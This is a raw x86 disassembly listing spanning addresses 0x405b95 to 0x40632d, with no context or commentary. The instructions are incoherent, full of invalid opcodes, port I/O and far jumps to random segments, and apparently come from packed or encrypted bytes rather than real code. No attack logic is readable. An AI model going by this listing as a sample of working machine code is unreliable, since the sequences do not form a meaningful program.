  405b95:	ss mov cl,0xcb
  405b98:	(bad)  
  405b99:	hlt    
  405b9a:	stc    
  405b9b:	gs inc edx
  405b9d:	inc    esp
  405b9e:	sub    ecx,DWORD PTR [ecx-0x44]
  405ba1:	push   ds
  405ba2:	push   ecx
  405ba3:	xchg   esi,eax
  405ba4:	(bad)  
  405ba5:	sti    
  405ba6:	leave  
  405ba7:	add    edx,eax
  405ba9:	outs   dx,DWORD PTR ds:[esi]
  405baa:	add    esi,DWORD PTR [ecx+0x1f250d32]
  405bb0:	nop
  405bb1:	xchg   edx,eax
  405bb2:	fnsave [eax+0x502fc3b6]
  405bb8:	push   ss
  405bb9:	adc    al,0x7e
  405bbb:	push   ss
  405bbc:	(bad)  
  405bbe:	push   0xffffff93
  405bc0:	mov    ds:0xaf4606be,al
  405bc5:	xchg   ebx,eax
  405bc6:	jp     0x405c37
  405bc8:	ret    0x395c
  405bcb:	pop    esi
  405bcc:	mov    eax,0x8818d1bc
  405bd1:	jo     0x405c3b
  405bd3:	mov    esi,0x84f45ef1
  405bd8:	or     BYTE PTR [esi-0x5e07abf9],bl
  405bde:	adc    al,0xb4
  405be0:	fwait
  405be1:	cdq    
  405be2:	mov    ds:0x7612fe0c,eax
  405be7:	and    BYTE PTR [ebx],dh
  405be9:	adc    BYTE PTR [edi-0xbabd53b],ch
  405bef:	jb     0x405bf9
  405bf1:	jge    0x405bc2
  405bf3:	add    eax,DWORD PTR [bp-0x42]
  405bf7:	imul   ebp,DWORD PTR [ebx+edx*2+0x66],0x5fdafe08
  405bff:	inc    edx
  405c00:	rcr    DWORD PTR [edi+0x54],0x2b
  405c04:	inc    ecx
  405c05:	inc    edx
  405c06:	pop    es
  405c07:	add    ah,BYTE PTR [ecx]
  405c09:	pop    ds
  405c0a:	lods   eax,DWORD PTR ds:[esi]
  405c0b:	push   ss
  405c0c:	test   edx,esp
  405c0e:	leave  
  405c0f:	ins    DWORD PTR es:[edi],dx
  405c10:	sub    al,0x4f
  405c12:	add    BYTE PTR [eax+0x7f],dh
  405c15:	retf   
  405c16:	mov    ebp,0xe8d84306
  405c1b:	or     BYTE PTR [ebx],al
  405c1d:	inc    edi
  405c1e:	in     al,0xdb
  405c20:	xchg   esp,eax
  405c21:	(bad)  
  405c22:	pop    eax
  405c23:	sub    eax,0xd0645d46
  405c28:	popf   
  405c29:	push   edi
  405c2a:	mov    dh,0x2f
  405c2c:	scas   eax,DWORD PTR es:[edi]
  405c2d:	fist   WORD PTR [eax-0x38]
  405c30:	dec    eax
  405c31:	outs   dx,DWORD PTR ds:[esi]
  405c32:	inc    ecx
  405c33:	std    
  405c34:	sbb    esi,DWORD PTR [ecx-0x7f]
  405c37:	sub    ecx,DWORD PTR [edi+0x3b6ab140]
  405c3d:	cli    
  405c3e:	int3   
  405c3f:	dec    edi
  405c40:	sbb    cl,BYTE PTR [eax-0x7e]
  405c43:	ret    
  405c44:	icebp  
  405c45:	xchg   ecx,eax
  405c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c47:	mov    dl,BYTE PTR [ebx-0x74]
  405c4a:	inc    ecx
  405c4b:	add    BYTE PTR [ecx],dh
  405c4d:	jno    0x405bfe
  405c4f:	push   esi
  405c50:	cdq    
  405c51:	mov    cl,0x71
  405c53:	and    DWORD PTR [ecx-0x24],edx
  405c56:	dec    edx
  405c57:	jno    0x405c1c
  405c59:	mov    ebx,0xd9f4a4e2
  405c5e:	or     al,0xa1
  405c60:	(bad)  
  405c62:	and    eax,0xd937fad5
  405c67:	ret    0xf32f
  405c6a:	ror    BYTE PTR [eax-0x54],0x2b
  405c6e:	add    DWORD PTR [edx+0x75],esi
  405c71:	repnz dec ebx
  405c73:	push   esi
  405c74:	mov    ah,0x28
  405c76:	scas   al,BYTE PTR es:[edi]
  405c77:	cmp    al,0x86
  405c79:	pop    eax
  405c7a:	mov    DWORD PTR [esi-0x29],edi
  405c7d:	jo     0x405cb7
  405c7f:	popf   
  405c80:	or     eax,0x6512d08f
  405c85:	(bad)  
  405c88:	ja     0x405c85
  405c8a:	(bad)  
  405c8b:	pop    eax
  405c8c:	repnz sub eax,0xaeb5c978
  405c92:	(bad)  
  405c94:	mov    ebp,0x4979158f
  405c99:	stc    
  405c9a:	shl    BYTE PTR [ecx],0x8d
  405c9d:	ret    0x11c2
  405ca0:	and    DWORD PTR [esp+edi*2],edx
  405ca3:	jno    0x405cf8
  405ca5:	mov    bl,0xe6
  405ca7:	repnz pop ds
  405ca9:	leave  
  405caa:	push   esi
  405cab:	ret    
  405cac:	imul   esp,DWORD PTR [eax+ebp*8-0x45540439],0x971d612d
  405cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb8:	test   BYTE PTR [edi],cl
  405cba:	xchg   ebp,eax
  405cbb:	sbb    ecx,ecx
  405cbd:	mov    edi,0xf14b51e1
  405cc2:	shr    ch,0x87
  405cc5:	inc    edi
  405cc6:	and    ah,cl
  405cc8:	inc    edx
  405cc9:	fs loope 0x405d1a
  405ccc:	fs icebp 
  405cce:	fwait
  405ccf:	jae    0x405c6a
  405cd1:	push   ebp
  405cd2:	scas   eax,DWORD PTR es:[edi]
  405cd3:	icebp  
  405cd4:	ret    0x16c2
  405cd7:	das    
  405cd8:	mov    ch,0x52
  405cda:	repz mov ds:0x2242df3d,al
  405ce0:	or     cl,BYTE PTR [edi+0x28]
  405ce3:	fild   WORD PTR [ebx-0x2899c4f9]
  405ce9:	fiadd  WORD PTR [eax-0x5e79bd2f]
  405cef:	retf   
  405cf0:	add    eax,edx
  405cf2:	pop    eax
  405cf3:	lods   eax,DWORD PTR ds:[esi]
  405cf4:	cs pop ebx
  405cf6:	in     al,dx
  405cf7:	push   eax
  405cf8:	pop    ebx
  405cf9:	sbb    al,0x96
  405cfb:	mov    ebp,0x312893ef
  405d00:	es add al,0xdd
  405d03:	int3   
  405d04:	aam    0x6d
  405d06:	pusha  
  405d07:	jo     0x405cf9
  405d09:	cmp    al,0xd5
  405d0b:	mov    bh,0x23
  405d0d:	loopne 0x405cf3
  405d0f:	std    
  405d10:	mov    ch,0xd2
  405d12:	xchg   esi,eax
  405d13:	jg     0x405cd5
  405d15:	sbb    eax,0x5a2ccc25
  405d1a:	mov    bl,0xa3
  405d1c:	std    
  405d1d:	add    bl,BYTE PTR [edi-0x18]
  405d20:	cmp    DWORD PTR [eax+0x9],ecx
  405d23:	and    al,0x20
  405d25:	fiadd  WORD PTR [ebx+ebx*8]
  405d28:	cwde   
  405d29:	inc    esp
  405d2a:	in     eax,dx
  405d2b:	mov    DWORD PTR [edi-0x206c3e06],esi
  405d31:	push   edx
  405d32:	(bad)  
  405d34:	or     al,0x90
  405d36:	test   BYTE PTR [ebp+0x53],al
  405d39:	pop    ebp
  405d3a:	dec    ebp
  405d3b:	js     0x405d4d
  405d3d:	shl    DWORD PTR ds:0xc2e83d73,cl
  405d43:	xchg   ecx,eax
  405d44:	mov    al,ds:0x2d3791d3
  405d49:	dec    eax
  405d4a:	jp     0x405dae
  405d4c:	iret   
  405d4d:	xchg   ebx,eax
  405d4e:	push   esp
  405d4f:	xor    eax,0xa56bad04
  405d54:	mov    al,ds:0x496664ac
  405d59:	addr16 or eax,0x2b42bf0e
  405d5f:	out    0x6,ax
  405d62:	add    BYTE PTR es:[eax+0x677c6637],bl
  405d69:	jns    0x405d22
  405d6b:	xor    al,0x9a
  405d6d:	pop    esi
  405d6e:	mov    esi,0x5cacdc90
  405d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d74:	imul   ebp,eax,0x6c3a0c74
  405d7a:	dec    edi
  405d7b:	sub    al,0x30
  405d7d:	pop    es
  405d7e:	or     al,0x5b
  405d80:	out    dx,al
  405d81:	pop    esp
  405d82:	jmp    0x3aeb:0xb7b80e8c
  405d89:	jns    0x405da6
  405d8b:	ret    0x106d
  405d8e:	xchg   esi,eax
  405d8f:	fst    DWORD PTR [ebp+ebx*8+0x7]
  405d93:	mov    al,ds:0x33e5d52c
  405d98:	lods   al,BYTE PTR ds:[esi]
  405d99:	push   ebx
  405d9a:	es xchg edi,eax
  405d9c:	lahf   
  405d9d:	fsub   QWORD PTR [eax]
  405d9f:	dec    eax
  405da0:	push   eax
  405da1:	jbe    0x405dfc
  405da3:	xor    eax,0x8450d1f8
  405da8:	test   DWORD PTR [edi-0x673854f],ebx
  405dae:	jnp    0x405d75
  405db0:	outs   dx,DWORD PTR ds:[esi]
  405db1:	out    dx,eax
  405db2:	mov    es,WORD PTR [ebx]
  405db4:	sbb    BYTE PTR [ecx+0x37],bl
  405db7:	mov    dl,0x64
  405db9:	outs   dx,BYTE PTR ds:[esi]
  405dba:	ins    DWORD PTR es:[edi],dx
  405dbb:	sub    edi,ecx
  405dbd:	fcomp  DWORD PTR [edx]
  405dbf:	push   ecx
  405dc0:	mov    al,0x90
  405dc2:	fisttp QWORD PTR [edx+eiz*1-0x78]
  405dc6:	mov    ah,0x1b
  405dc8:	add    ch,BYTE PTR [ebx+0x6a632e3f]
  405dce:	(bad)  
  405dcf:	aas    
  405dd0:	jg     0x405da1
  405dd2:	xchg   esp,eax
  405dd3:	inc    ebx
  405dd4:	fimul  DWORD PTR [ebp-0x50]
  405dd7:	lods   al,BYTE PTR cs:[esi]
  405dd9:	aas    
  405dda:	pop    eax
  405ddb:	test   eax,0xd61f64be
  405de0:	jmp    0x22b13067
  405de5:	jle    0x405da0
  405de7:	and    DWORD PTR [ebx+0x10],0xffffffff
  405deb:	push   ecx
  405dec:	es lahf 
  405dee:	rcl    DWORD PTR [esi],0x1c
  405df1:	lods   eax,DWORD PTR ds:[esi]
  405df2:	aas    
  405df3:	lock ror BYTE PTR [edx],1
  405df6:	hlt    
  405df7:	inc    edi
  405df8:	xor    bh,al
  405dfa:	ss ss test eax,0x858a79f8
  405e01:	sbb    eax,0xc276cccb
  405e06:	dec    DWORD PTR [edi-0x30]
  405e09:	xchg   edx,eax
  405e0a:	xchg   ecx,eax
  405e0b:	inc    ebx
  405e0c:	je     0x405e38
  405e0e:	loope  0x405dc1
  405e10:	jl     0x405e43
  405e12:	mov    bl,0x4e
  405e14:	ret    
  405e15:	push   ss
  405e16:	pop    eax
  405e17:	xor    eax,0xa88f41b5
  405e1c:	dec    ebp
  405e1d:	sahf   
  405e1e:	mov    ch,0xab
  405e20:	retf   0x36f4
  405e23:	xchg   esi,eax
  405e24:	iret   
  405e25:	fadd   QWORD PTR [ebx]
  405e27:	clc    
  405e28:	rcl    ah,cl
  405e2a:	ins    BYTE PTR es:[edi],dx
  405e2b:	js     0x405e97
  405e2d:	adc    edx,0xd6dc2a8e
  405e33:	daa    
  405e34:	scas   eax,DWORD PTR es:[edi]
  405e35:	retf   
  405e36:	rcl    DWORD PTR [esi-0x5c],1
  405e39:	loop   0x405e95
  405e3b:	pop    ds
  405e3c:	(bad)  
  405e3d:	nop    DWORD PTR [ecx]
  405e40:	test   eax,0xdde84e6c
  405e45:	jo     0x405dd5
  405e47:	(bad)  
  405e48:	cld    
  405e49:	mov    BYTE PTR [ebx-0x3a30445d],ah
  405e4f:	cmc    
  405e50:	push   0x6c1427
  405e55:	test   BYTE PTR ds:0xe5912116,bh
  405e5b:	mov    edi,0x8f911dfb
  405e60:	sbb    BYTE PTR [esp+edx*8],cl
  405e63:	and    esp,DWORD PTR [ecx+0x5a830e14]
  405e69:	push   esi
  405e6a:	sbb    edx,DWORD PTR [edx]
  405e6c:	ins    DWORD PTR es:[edi],dx
  405e6d:	add    BYTE PTR [ecx],ah
  405e6f:	mov    dh,0x52
  405e71:	xor    BYTE PTR [eax+0x151a01e0],dl
  405e77:	in     eax,0x47
  405e79:	out    dx,al
  405e7a:	mov    ds:0x92a5d2b4,eax
  405e7f:	bound  edx,QWORD PTR [edi-0x10]
  405e82:	xor    ah,ch
  405e84:	or     DWORD PTR [ebx-0x5659441],esi
  405e8a:	add    DWORD PTR [edx-0x68f3129f],esi
  405e90:	stc    
  405e91:	mov    dl,0x24
  405e93:	cs push ebx
  405e95:	jne    0x405ee3
  405e97:	and    DWORD PTR [eax+0xd9c3cd9],eax
  405e9d:	inc    edx
  405e9e:	xlat   BYTE PTR ds:[ebx]
  405e9f:	das    
  405ea0:	lahf   
  405ea1:	jge    0x405e46
  405ea3:	xchg   ebp,eax
  405ea4:	bound  esp,QWORD PTR [edi-0x63]
  405ea7:	xchg   ebp,eax
  405ea8:	stos   DWORD PTR es:[edi],eax
  405ea9:	push   ds
  405eaa:	and    BYTE PTR [ecx],al
  405eac:	push   ebx
  405ead:	push   eax
  405eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eaf:	xchg   edi,eax
  405eb0:	mov    eax,ds:0x2e4382b1
  405eb5:	sbb    bh,BYTE PTR [esi+0x77]
  405eb8:	in     eax,dx
  405eb9:	push   edi
  405eba:	sub    eax,ebp
  405ebc:	gs cmp al,0x26
  405ebf:	mov    al,0xaa
  405ec1:	sti    
  405ec2:	jnp    0x405e58
  405ec4:	sar    dh,1
  405ec6:	fimul  WORD PTR [eax+0x25]
  405ec9:	mov    esp,0x7f9805a5
  405ece:	dec    eax
  405ecf:	outs   dx,BYTE PTR ds:[esi]
  405ed0:	or     edx,edi
  405ed2:	fcom   st(5)
  405ed4:	push   ebp
  405ed5:	sub    DWORD PTR [edi],0xffffff80
  405ed8:	das    
  405ed9:	mov    dh,BYTE PTR [ecx+edi*1+0x66]
  405edd:	pop    edx
  405ede:	fstp   QWORD PTR [eax]
  405ee0:	adc    bh,BYTE PTR [edx]
  405ee2:	jl     0x405efc
  405ee4:	dec    ebx
  405ee5:	mul    DWORD PTR [esi-0x7a]
  405ee8:	push   ebx
  405ee9:	dec    esi
  405eea:	scas   eax,DWORD PTR es:[edi]
  405eeb:	outs   dx,BYTE PTR ds:[esi]
  405eec:	sbb    al,0x2e
  405eee:	jae    0x405ed6
  405ef0:	xchg   esp,eax
  405ef1:	jnp    0x405f4b
  405ef3:	sbb    ebx,DWORD PTR [edx+edx*1]
  405ef6:	loop   0x405e8b
  405ef8:	xor    dl,bl
  405efa:	int3   
  405efb:	aaa    
  405efc:	ror    DWORD PTR [eax+0x23c7df52],0x24
  405f03:	dec    ebp
  405f04:	call   0xd08a60f1
  405f09:	and    eax,0x8aaace4c
  405f0e:	loope  0x405ec2
  405f10:	ret    0xc1d3
  405f13:	sub    eax,0xc44e55e7
  405f18:	mov    dl,0x50
  405f1a:	repz mov eax,0x9755cc36
  405f20:	or     ecx,ecx
  405f22:	jmp    0x22f5:0x3bb61d88
  405f29:	push   ebx
  405f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f2b:	pop    es
  405f2c:	sbb    DWORD PTR [eax-0x1b],ebp
  405f2f:	push   ebx
  405f30:	or     edx,DWORD PTR [eax+0x2b]
  405f33:	movups XMMWORD PTR [edi+ecx*4],xmm5
  405f37:	mov    edi,0x199e027f
  405f3c:	and    al,0x68
  405f3e:	jae    0x405f6d
  405f40:	imul   esp,DWORD PTR [ebx],0x675a8dfa
  405f46:	jo     0x405f76
  405f48:	mov    WORD PTR [ebx-0x53],ds
  405f4b:	mov    cl,0xbd
  405f4d:	retf   0xafcf
  405f50:	jb     0x405f56
  405f52:	pop    ds
  405f53:	push   eax
  405f54:	jo     0x405fa4
  405f56:	popa   
  405f57:	jbe    0x405f00
  405f59:	call   0x8442:0x9514fed9
  405f60:	out    dx,eax
  405f61:	jno    0x405f6d
  405f63:	sti    
  405f64:	sahf   
  405f65:	xor    BYTE PTR ds:0x3ba94bbd,bl
  405f6b:	jnp    0x405efc
  405f6d:	xor    DWORD PTR [esi-0x65],esi
  405f70:	sub    bl,BYTE PTR [ebx+0x1b]
  405f73:	push   edi
  405f74:	addr16 jge 0x405f3c
  405f77:	adc    BYTE PTR [esi-0x78e333e],cl
  405f7d:	xor    BYTE PTR [eax+0x13],ah
  405f80:	sub    esi,DWORD PTR [edi+0x2c]
  405f83:	hlt    
  405f84:	cmp    bh,bh
  405f86:	ret    
  405f87:	jo     0x405f16
  405f89:	lds    edx,FWORD PTR [ebp+0x10]
  405f8c:	call   0x990e:0x4f2c61de
  405f93:	jno    0x405f75
  405f95:	dec    eax
  405f96:	in     eax,dx
  405f97:	add    bh,ah
  405f99:	repnz pop edi
  405f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f9c:	sub    DWORD PTR [edi+0x30],ecx
  405f9f:	pop    eax
  405fa0:	mov    eax,0xa8d1b04b
  405fa5:	mov    al,0xba
  405fa7:	mov    bl,0x68
  405fa9:	fsubr  DWORD PTR [ebx-0x66]
  405fac:	jns    0x405f60
  405fae:	mov    eax,0x6ae6a23a
  405fb3:	popa   
  405fb4:	jge    0x405fbf
  405fb6:	push   eax
  405fb7:	and    al,0x54
  405fb9:	fimul  DWORD PTR [esi+esi*1+0x60]
  405fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fbe:	es push cs
  405fc0:	cs mov bl,0xc8
  405fc3:	ja     0x405f8e
  405fc5:	loopne 0x405f9f
  405fc7:	cmp    DWORD PTR [ebp-0x549d4dd7],edx
  405fcd:	rol    DWORD PTR gs:[eax+0x749bf945],0x4a
  405fd5:	mov    ebp,0xa3250532
  405fda:	stos   BYTE PTR es:[edi],al
  405fdb:	ret    
  405fdc:	test   al,0xa9
  405fde:	pop    ecx
  405fdf:	or     al,0xd5
  405fe1:	xchg   edi,eax
  405fe2:	push   ecx
  405fe3:	inc    ebx
  405fe4:	add    eax,DWORD PTR [edi-0x24]
  405fe7:	jmp    0x8a156b21
  405fec:	aas    
  405fed:	cld    
  405fee:	retf   0x4fff
  405ff1:	adc    esp,DWORD PTR [esi]
  405ff3:	add    dl,BYTE PTR [edi-0x6ececd33]
  405ff9:	jl     0x406048
  405ffb:	jecxz  0x405fd8
  405ffd:	mov    DWORD PTR [edi],edx
  405fff:	or     BYTE PTR [esi],ah
  406001:	js     0x40600c
  406003:	add    DWORD PTR [eax-0x167464e4],ebp
  406009:	fcomp  DWORD PTR [ebx+0x2b7b8c73]
  40600f:	in     al,0xba
  406011:	in     eax,dx
  406012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406013:	push   eax
  406014:	push   eax
  406015:	enter  0x42d4,0x64
  406019:	mov    ebp,0x8fadcf5b
  40601e:	bound  edx,QWORD PTR [ebp+esi*2+0x16e97996]
  406025:	repz cld 
  406027:	popa   
  406028:	mov    WORD PTR ds:0x2ada3bc1,ds
  40602e:	mov    edi,cs
  406030:	iret   
  406031:	cmc    
  406032:	lods   al,BYTE PTR ds:[esi]
  406033:	retf   0x3ff0
  406036:	iret   
  406037:	(bad)  [ebx+0x36]
  40603a:	ror    DWORD PTR [eax-0x3a0aa574],0x7
  406041:	pop    ds
  406042:	jmp    0xb8c6067a
  406047:	js     0x4060b3
  406049:	sti    
  40604a:	xchg   ecx,eax
  40604b:	add    bh,ah
  40604d:	sbb    eax,DWORD PTR [eax-0x16]
  406050:	cwde   
  406051:	jae    0x406016
  406053:	fisttp WORD PTR [edx+0x23]
  406056:	xchg   ebx,edi
  406058:	dec    esp
  406059:	sbb    al,BYTE PTR [esi-0x62de7e20]
  40605f:	and    ecx,ecx
  406061:	ja     0x405ffc
  406063:	retf   0xe4db
  406066:	in     eax,dx
  406067:	sbb    BYTE PTR [ebp+0xf33ef01],dh
  40606d:	bound  ebp,QWORD PTR [ebx+0x7f]
  406070:	out    dx,al
  406071:	mov    edx,0x974cb52f
  406076:	inc    ecx
  406077:	jge    0x33275b0
  40607d:	inc    bl
  40607f:	js     0x4060ef
  406081:	(bad)  
  406082:	jmp    0x40607b
  406084:	arpl   WORD PTR [esi],di
  406086:	mov    cl,0x12
  406088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406089:	(bad)  
  40608a:	jns    0x4060e2
  40608c:	lock jmp 0xeb9a37f0
  406092:	call   0x313d:0x3a9d62cb
  406099:	dec    ebx
  40609a:	or     dh,BYTE PTR [edx+ecx*2]
  40609d:	jae    0x40611d
  40609f:	lea    esp,[edx]
  4060a1:	or     cl,BYTE PTR [edx+ebx*2-0x33]
  4060a5:	adc    BYTE PTR [edi],al
  4060a7:	lods   eax,DWORD PTR ds:[esi]
  4060a8:	mov    ebx,0x9890c35e
  4060ad:	lds    edi,FWORD PTR [ebp+eiz*2-0x24289370]
  4060b4:	(bad)  
  4060b5:	leave  
  4060b6:	icebp  
  4060b7:	jne    0x406120
  4060b9:	jo     0x40611f
  4060bb:	inc    ebp
  4060bc:	outs   dx,DWORD PTR ds:[esi]
  4060bd:	mov    ah,0xc5
  4060bf:	sbb    ebp,0xffffffb7
  4060c2:	aad    0xa7
  4060c4:	clc    
  4060c5:	and    ebx,DWORD PTR [esi+0xdad77a1]
  4060cb:	pop    ds
  4060cc:	lods   eax,DWORD PTR ds:[esi]
  4060cd:	jbe    0x406070
  4060cf:	sbb    eax,0x6b8a4214
  4060d4:	or     al,0xc7
  4060d6:	daa    
  4060d7:	lods   al,BYTE PTR ds:[esi]
  4060d8:	fs daa 
  4060da:	mov    WORD PTR [eax-0x54],gs
  4060dd:	lahf   
  4060de:	mov    ebx,ecx
  4060e0:	push   ebx
  4060e1:	add    eax,0xb26c1957
  4060e6:	jg     0x406159
  4060e8:	or     esp,eax
  4060ea:	leave  
  4060eb:	jl     0x4060c4
  4060ed:	mov    dl,BYTE PTR [edi+0x3d5ab18c]
  4060f3:	sbb    BYTE PTR [ecx-0xe],cl
  4060f6:	jno    0x40609e
  4060f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060f9:	js     0x406154
  4060fb:	adc    cl,ch
  4060fd:	lock mov ebp,0x93a0585c
  406103:	iret   
  406104:	rol    ebx,0x87
  406107:	(bad)  
  406108:	mov    ah,0xa2
  40610a:	xor    eax,0xbeb25d05
  40610f:	(bad)  
  406110:	imul   DWORD PTR [ebx-0x5fa66383]
  406116:	loopne 0x4060cc
  406118:	pop    ebx
  406119:	je     0x406149
  40611b:	dec    ecx
  40611c:	hlt    
  40611d:	push   0x7d
  40611f:	mov    DWORD PTR [edx],eax
  406121:	lds    edi,FWORD PTR [esi]
  406123:	mov    ebp,0xaec80f2e
  406128:	fisttp QWORD PTR [ebp-0x34e43262]
  40612e:	pop    esi
  40612f:	cmp    eax,0x3416bd0d
  406134:	add    eax,0x95cba10a
  406139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40613a:	push   0x3b8bcb06
  40613f:	test   al,0x82
  406141:	out    0xa,al
  406143:	sub    dh,BYTE PTR ds:[ecx-0x2ad86107]
  40614a:	cmp    al,BYTE PTR [edi]
  40614c:	or     BYTE PTR [eax+0x29a88f23],dh
  406152:	not    BYTE PTR [esi]
  406154:	adc    bh,BYTE PTR [edi-0x246c43fc]
  40615a:	cmp    eax,0xfff16139
  40615f:	xchg   edi,eax
  406160:	popa   
  406161:	lods   al,BYTE PTR ds:[esi]
  406162:	dec    edi
  406163:	or     DWORD PTR [ecx+0x59e07d6],esp
  406169:	gs mov al,gs:0xfb1cf7b9
  406170:	jne    0x4061ac
  406172:	ss dec esi
  406174:	mov    ds:0xb371632e,al
  406179:	mov    esp,0x86b4d39f
  40617e:	xchg   DWORD PTR [eax+0x3ddba72a],esp
  406184:	or     BYTE PTR [ebp+0x49252b5c],bh
  40618a:	push   0x53
  40618c:	repz jl 0x4061b4
  40618f:	test   dh,bh
  406191:	imul   eax,eax,0x614e8519
  406197:	adc    al,BYTE PTR cs:[edx]
  40619a:	retf   0xa86d
  40619d:	or     DWORD PTR [ebx-0x74],edx
  4061a0:	fcmove st,st(7)
  4061a2:	(bad)  ds:0x56463048
  4061a8:	fst    QWORD PTR [edx-0x91e95e7]
  4061ae:	adc    al,0xa1
  4061b0:	inc    ebp
  4061b1:	out    dx,eax
  4061b2:	adc    cl,ah
  4061b4:	and    esi,edx
  4061b6:	loop   0x406192
  4061b8:	data16 mov cl,bh
  4061bb:	call   0x5e8a:0x8900e74c
  4061c2:	xchg   ecx,eax
  4061c3:	add    eax,0x51b05f4e
  4061c8:	scas   eax,DWORD PTR es:[edi]
  4061c9:	mov    edi,0xb4d256ef
  4061ce:	dec    esi
  4061cf:	sbb    BYTE PTR [edx],ah
  4061d1:	fwait
  4061d2:	int3   
  4061d3:	loope  0x4061c5
  4061d5:	shr    DWORD PTR [esi+ebx*8-0x60abbe54],cl
  4061dc:	popa   
  4061dd:	and    ebp,DWORD PTR [eax-0x662bd0b]
  4061e3:	scas   eax,DWORD PTR es:[edi]
  4061e4:	out    0xbf,al
  4061e6:	or     eax,0x34d66f90
  4061eb:	les    eax,FWORD PTR [ebp+0x6c]
  4061ee:	test   al,0xe2
  4061f0:	push   edx
  4061f1:	mov    DWORD PTR [esi-0x5d],eax
  4061f4:	ins    BYTE PTR es:[di],dx
  4061f6:	or     DWORD PTR [esi+0x2a],0xffffffd0
  4061fa:	or     ebx,DWORD PTR [edx]
  4061fc:	lds    esi,FWORD PTR [edx+0x18e1f841]
  406202:	xor    edi,esi
  406204:	(bad)  
  406205:	push   eax
  406206:	mov    DWORD PTR [edi],ecx
  406208:	pop    edi
  406209:	clc    
  40620a:	sti    
  40620b:	pop    ss
  40620c:	int    0x73
  40620e:	cld    
  40620f:	mov    dh,BYTE PTR [ebx-0x1b72f039]
  406215:	push   0xfffffff1
  406217:	mov    eax,ds:0xb0e102cb
  40621c:	test   eax,0x2b77dfda
  406221:	mov    gs,WORD PTR [eax-0x50]
  406224:	and    esi,DWORD PTR [ebx+0x2b]
  406227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406228:	pop    ebp
  406229:	jne    0x4061d3
  40622b:	push   esp
  40622c:	leave  
  40622d:	ret    
  40622e:	xchg   esi,eax
  40622f:	imul   edi,DWORD PTR [ecx-0x4f],0xfffffff1
  406233:	mov    ds:0x140f93d,al
  406238:	inc    esp
  406239:	cmp    al,0x93
  40623b:	daa    
  40623c:	in     al,dx
  40623d:	adc    cl,al
  40623f:	push   eax
  406240:	mov    edx,0x82b6ea91
  406245:	mov    esi,0x8342fb0
  40624b:	inc    esi
  40624c:	aad    0x4c
  40624e:	add    cl,0xcf
  406251:	rcl    DWORD PTR [ebp-0x6d399b85],1
  406257:	sbb    al,0x29
  406259:	aas    
  40625a:	inc    esp
  40625b:	xchg   DWORD PTR [eax],esi
  40625d:	test   bl,ah
  40625f:	mov    DWORD PTR [ebx],esp
  406261:	popf   
  406262:	fnsave [edi+edx*4-0x35]
  406266:	sbb    al,BYTE PTR [ecx]
  406268:	pop    ds
  406269:	and    BYTE PTR [ecx-0xc671977],dl
  40626f:	jmp    0x319fecca
  406274:	outs   dx,DWORD PTR ds:[esi]
  406275:	scas   eax,DWORD PTR es:[edi]
  406276:	bound  ebp,QWORD PTR [eax]
  406278:	std    
  406279:	jmp    0xfe129bf5
  40627e:	push   es
  40627f:	sbb    DWORD PTR [ecx],ecx
  406281:	cmp    ebx,DWORD PTR [ebp+0x66]
  406284:	jns    0x40621a
  406286:	xchg   esi,eax
  406287:	aad    0xd9
  406289:	dec    eax
  40628a:	and    DWORD PTR [ecx+edi*4],0xc7e62667
  406291:	lods   al,BYTE PTR ds:[esi]
  406292:	mov    ds:0xdc0876f,eax
  406297:	and    edi,ecx
  406299:	fsubp  st(2),st
  40629b:	fidivr WORD PTR [ebx+0x1c0a535a]
  4062a1:	jp     0x406238
  4062a3:	(bad)  
  4062a4:	(bad)  
  4062a5:	push   edi
  4062a6:	sti    
  4062a7:	ja     0x4062dc
  4062a9:	aam    0xf6
  4062ab:	out    dx,al
  4062ac:	jge    0x40625e
  4062ae:	push   edi
  4062af:	leave  
  4062b0:	or     al,0x88
  4062b2:	mov    eax,0x8e5631df
  4062b7:	fisttp QWORD PTR [esi-0x2d3d89b9]
  4062bd:	mov    ds:0x237ad868,eax
  4062c2:	out    dx,eax
  4062c3:	xchg   dl,al
  4062c5:	aam    0xbc
  4062c7:	dec    esi
  4062c8:	daa    
  4062c9:	daa    
  4062ca:	loop   0x40625b
  4062cc:	push   es
  4062cd:	adc    al,0xcc
  4062cf:	ss mov dh,0xf2
  4062d2:	es jne 0x406295
  4062d5:	(bad)  
  4062d6:	or     eax,0x506e2bd1
  4062db:	loop   0x40634d
  4062dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062de:	outs   dx,DWORD PTR ds:[esi]
  4062df:	jle    0x4062db
  4062e1:	sbb    al,0xac
  4062e3:	dec    ebp
  4062e4:	(bad)  
  4062e6:	loop   0x406326
  4062e8:	jo     0x4062fa
  4062ea:	pushf  
  4062eb:	jns    0x40631c
  4062ed:	pop    di
  4062ef:	pop    ebp
  4062f0:	gs stos BYTE PTR es:[edi],al
  4062f2:	xor    al,0xb9
  4062f4:	(bad)  
  4062f5:	add    eax,0x9b11e245
  4062fa:	test   al,0x2a
  4062fc:	stc    
  4062fd:	adc    eax,0x48d18b1a
  406302:	aaa    
  406303:	aam    0xb8
  406305:	pop    esp
  406306:	pop    ss
  406307:	aad    0x18
  406309:	dec    edx
  40630a:	sub    BYTE PTR [edi+edx*1-0x7e],al
  40630e:	ja     0x40631d
  406310:	aas    
  406311:	jecxz  0x406313
  406313:	or     al,0x76
  406315:	(bad)  
  406317:	mov    ebx,0xabe07a77
  40631c:	inc    esi
  40631d:	dec    ebp
  40631e:	(bad)  
  40631f:	sbb    DWORD PTR [esi-0x4b604877],edx
  406325:	dec    esp
  406326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406327:	in     al,dx
  406328:	rcl    dh,1
  40632a:	and    ebx,DWORD PTR [edi-0x22]
  40632d:	or     DWORD PTR [ebx-0x7e05130d],0x27
